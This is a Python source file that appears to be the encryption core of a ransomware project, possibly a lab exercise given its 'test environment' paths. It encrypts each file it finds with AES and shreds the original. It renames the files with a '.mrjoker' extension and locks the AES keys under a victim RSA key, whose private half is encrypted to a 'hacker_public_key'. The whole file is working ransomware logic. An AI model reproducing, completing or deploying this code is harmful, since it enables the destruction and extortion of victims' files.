import os
import gc
import base64
import pickle

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

import utils
import variables
import file_test
import test_key_gen

from symmetric import AESCipher
from asymmetric import RSACipher


def encrypt_priv_key(msg, key):
    n = 127
    x = [msg[i:i+n] for i in range(0, len(msg), n)]

    key = RSA.importKey(key)
    cipher = PKCS1_OAEP.new(key)
    encrypted = []
    for i in x:
        ciphertext = cipher.encrypt(i)
        encrypted.append(ciphertext)
    return encrypted


def start_encryption(files):
    AES_and_base64_path = []
    for found_file in files:
        key = test_key_gen.generate_key(128, True)
        AES_obj = AESCipher(key)

        found_file = base64.b64decode(found_file)

        try:
            with open(found_file, 'rb') as f:
                file_content = f.read()
        except:
            continue

        encrypted = AES_obj.encrypt(file_content)
        utils.shred(found_file)

        new_file_name = found_file.decode('utf-8') + ".mrjoker"
        with open(new_file_name, 'wb') as f:
            f.write(encrypted)

        base64_new_file_name = base64.b64encode(bytes(new_file_name, 'utf-8'))

        AES_and_base64_path.append((key, base64_new_file_name))
    return AES_and_base64_path


def main():

    try:
        if variables.local_root[1:] not in os.listdir():
            os.makedirs(variables.test_enviournment_path)
    except OSError as err:
        raise err

    files = file_test.find_files(variables.test_enviournment_path)

    rsa_object = RSACipher()
    rsa_object.generate_keys()

    client_private_key = rsa_object.private_key_PEM
    client_public_key = rsa_object.public_key_PEM

    encrypted_client_private_key = encrypt_priv_key(client_private_key, variables.hacker_public_key)

    with open(variables.encrypted_client_private_key_path, 'wb') as output:
        pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)

    with open(variables.client_public_key_path, 'wb') as f:
        f.write(client_public_key)

    client_private_key = None
    rsa_object = None
    del rsa_object
    del client_private_key
    gc.collect()

    client_public_key_object = RSA.importKey(client_public_key)
    client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)

    aes_keys_and_base64_path = start_encryption(files)
    enc_aes_key_and_base64_path = []

    for _ in aes_keys_and_base64_path:
        aes_key = _[0]
        base64_path = _[1]

        encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
        enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))

    aes_keys_and_base64_path = None
    del aes_keys_and_base64_path
    gc.collect()

    with open(variables.aes_encrypted_keys_path, 'w') as f:
        for _ in enc_aes_key_and_base64_path:
            line = base64.b64encode(_[0]) + bytes(" ", 'utf-8') + _[1] + bytes("\n", 'utf-8')
            f.write(line.decode('utf-8'))

    enc_aes_key_and_base64_path = None
    del enc_aes_key_and_base64_path
    gc.collect()


if __name__ == '__main__':
    main()
